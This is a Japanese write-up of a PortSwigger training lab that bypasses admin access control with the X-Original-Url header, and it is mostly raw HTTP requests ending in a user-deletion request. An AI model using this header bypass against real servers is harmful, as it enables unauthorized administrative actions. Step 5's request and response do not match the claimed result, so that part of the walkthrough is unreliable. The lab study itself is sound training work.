# X-Original-Url によるバイパス

一部の PHP フレームワークは、X-Original-URL や X-Rewrite-URL など、元のリクエストの URL を上書きするために使用できるさまざまな非標準の HTTP ヘッダーをサポートしています。

以下のハッキングラボに対して実行します  
https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

- 1. BurpSuite を起動し、Proxy タブからブラウザを起動
- 2. ハッキングラボにアクセスします
- 3. ハッキングラボ/admin にアクセスすると、Access Denied になります

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 15

"Access denied"
```

- 4. 以下のリクエストを送信すると

```
GET / HTTP/2
Host: 0ae100e2037ff49b803ac7b300b200a4.web-security-academy.net
Cookie: session=UVQYa9kBrDBajLJcraakH1L5tAp5kMGH
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Content-Length: 2
```

以下のレスポンスが得られます

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 12781

<!DOCTYPE html>
<html>
```

- 5. カスタムヘッダーで URL を上書きします

```
GET /admin HTTP/2
Host: 0a1900eb04dd07f6807cad130038007e.web-security-academy.net
Cookie: session=i7htlmZJj1tIFPuB1uBzsyu1I5F3vpXM
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1900eb04dd07f6807cad130038007e.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
X-Original-Url: /invalid
```

以下のレスポンスが得られます

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 15

"Access denied"
```

- 6. 管理パネルにアクセスできるようになるので、ユーザーを消そうとすると、Access denied になるので、このリクエストを Send to Repeater します

- 7. リクエストを書き換えると、ユーザー削除リクエストが受け付けられます。
     [変更前]

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a1900eb04dd07f6807cad130038007e.web-security-academy.net
Cookie: session=i7htlmZJj1tIFPuB1uBzsyu1I5F3vpXM
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1900eb04dd07f6807cad130038007e.web-security-academy.net/?username=carlos
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

[変更後]

```
GET /?username=carlos HTTP/2
Host: 0a1900eb04dd07f6807cad130038007e.web-security-academy.net
Cookie: session=i7htlmZJj1tIFPuB1uBzsyu1I5F3vpXM
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1900eb04dd07f6807cad130038007e.web-security-academy.net/?username=carlos
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
X-Original-Url: /admin/delete
```
